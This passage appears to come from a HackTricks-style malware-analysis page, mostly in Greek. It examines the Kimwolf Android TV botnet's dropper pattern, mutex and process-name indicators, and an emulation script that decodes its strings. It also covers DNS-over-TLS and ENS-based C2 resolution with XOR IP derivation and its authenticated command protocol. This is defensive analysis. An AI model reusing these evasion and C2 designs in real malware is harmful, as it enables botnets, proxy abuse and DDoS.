- Οι reverse engineers που αναζητούν αυτό το pattern μπορούν να κάνουν diff του `AndroidManifest.xml` για κρυμμένους boot receivers και κώδικα που αναφέρεται σε `Resources.openRawResource` → `FileOutputStream` → `Runtime.getRuntime().exec("su")`. Μόλις το ELF απορριφθεί, χειριστείτε το ως Linux userland backdoor (το Kimwolf είναι UPX-packed, stripped, statically linked, 32-bit ARM EABI5).

### Runtime mutexes & masquerading IOCs
- Κατά την εκκίνηση, το Kimwolf δεσμεύει ένα **abstract UNIX domain socket** όπως `@niggaboxv4`/`@niggaboxv5`. Υπάρχοντα sockets προκαλούν έξοδο, οπότε το όνομα του socket λειτουργεί τόσο ως mutex όσο και ως forensic artifact.
- Ο τίτλος της διεργασίας αντικαθίσταται με ονόματα που μοιάζουν με service (`netd_services`, `tv_helper`, κ.λπ.) για να ενσωματωθεί στις λίστες διεργασιών Android. Host-based detections μπορούν να ειδοποιήσουν για αυτά τα ονόματα σε συνδυασμό με το mutex socket.

### Stack XOR string decoding with ARM NEON + flare_emu
- Ευαίσθητες συμβολοσειρές (C2 domains, resolvers, DoT endpoints) ωθούνται στην στοίβα σε κρυπτογραφημένα blocks των 8 bytes και αποκωδικοποιούνται επί τόπου μέσω `VEOR Qx, Qx, Qy` (`veorq_s64`). Οι αναλυτές μπορούν να scriptάρουν το **flare_emu** για να πιάσουν τον αποκρυπτογραφημένο pointer κάθε φορά που ο decryptor τον παραδίδει στον caller:
```python
import flare_emu

eh = flare_emu.EmuHelper()

def hook(eh, addr, argv, _):
if eh.isValidEmuPtr(argv[1]):
print(hex(addr), eh.getEmuString(argv[1]))

eh.iterate(0x8F00, hook)  # sub_8F00 consumes the plaintext R1 argument
```
- Αναζήτηση για `VEOR Q8, Q8, Q9` / `veorq_s64` ακολουθίες και η εξομοίωση των εύρων τους ξεφορτώνει μαζικά κάθε αποκρυπτογραφημένη συμβολοσειρά, παρακάμπτοντας τη στοίβα-μόνο διάρκεια ζωής του plaintext.

### DNS-over-TLS resolution plus XOR IP derivation
- Όλες οι παραλλαγές του Kimwolf επιλύουν τα C2 domains μιλώντας **DNS-over-TLS (TCP/853)** απευθείας με την Google (8.8.8.8) ή την Cloudflare (1.1.1.1), παρακάμπτοντας plain DNS logging ή hijacking.
- Τα v4 bots απλώς χρησιμοποιούν το επιστρεφόμενο IPv4 A record. Τα v5 bots αντιμετωπίζουν το A record ως 32-bit integer, αλλάζουν το endianness του, κάνουν XOR με τη σταθερά `0x00ce0491`, και μετά επαναφέρουν το endianness για να αποκτήσουν τη πραγματική C2 IP. CyberChef recipe: Change IP format → swap endianness per 4-byte chunk → XOR with `00 ce 04 91` → convert back to dotted decimal.

### ENS / EtherHiding fallback
- Σε μεταγενέστερα builds προστίθεται ένα ENS domain (`pawsatyou.eth`) του οποίου το resolver text key `"lol"` αποθηκεύει μια φαινομενικά ακίνδυνη IPv6 (`fed0:5dec:...:1be7:8599`).
- Το bot παίρνει τα τελευταία τέσσερα bytes (`1b e7 85 99`), τα XORάρει με `0x93141715`, και ερμηνεύει το αποτέλεσμα ως IPv4 C2 (`136.243.146.140`). Η ενημέρωση του ENS text record περιστρέφει άμεσα τα downstream C2s μέσω του blockchain χωρίς να πειράζει το DNS.

### TLS + ECDSA authenticated command channel
- Η κίνηση είναι ενθυλακωμένη σε wolfSSL με ένα προσαρμοσμένο framed πρωτόκολλο:
```go
struct Header {
Magic    [4]byte // e.g. "DPRK", "FD9177FF", "AD216CD4"
Reserved uint8   // 0x01
MsgType  uint8   // verb
MsgID    uint32
BodyLen  uint32
CRC32    uint32
}
```
- Bootstrap: το bot στέλνει δύο κενά `MsgType=0 (register)` headers. Το C2 απαντά με `MsgType=1 (verify)` που περιέχει μια τυχαία πρόκληση καθώς και μια ASN.1 DER **ECDSA** υπογραφή. Τα bots την επαληθεύουν έναντι ενός ενσωματωμένου SubjectPublicKeyInfo blob; αποτυχίες τερματίζουν τη συνεδρία, αποτρέποντας hijacked/sinkholed C2 nodes από το να task the fleet.
- Μόλις επαληθευτεί, το bot στέλνει ένα σώμα `MsgType=0` που φέρει το operator-defined **group string** (π.χ. `android-postboot-rt`). Εάν η ομάδα είναι enabled, το C2 απαντά με `MsgType=2 (confirm)`, μετά από το οποίο ξεκινάει το tasking (MsgType 5–12).
- Οι υποστηριζόμενες εντολές περιλαμβάνουν SOCKS-style TCP/UDP proxying (residential proxy monetization), reverse shell / single command exec, file read/write, και **Mirai-compatible DDoSBody** payloads (same `AtkType`, `Duration`, `Targets[]`, `Flags[]` layout).

## Αναφορές

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Kimwolf Android TV Botnet: ENS-Based C2 Evasion, TLS+ECDSA C2 Protocol, and Large-Scale Proxy/DDoS Operations – [blog.xlab.qianxin.com](https://blog.xlab.qianxin.com/kimwolf-botnet-en/)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
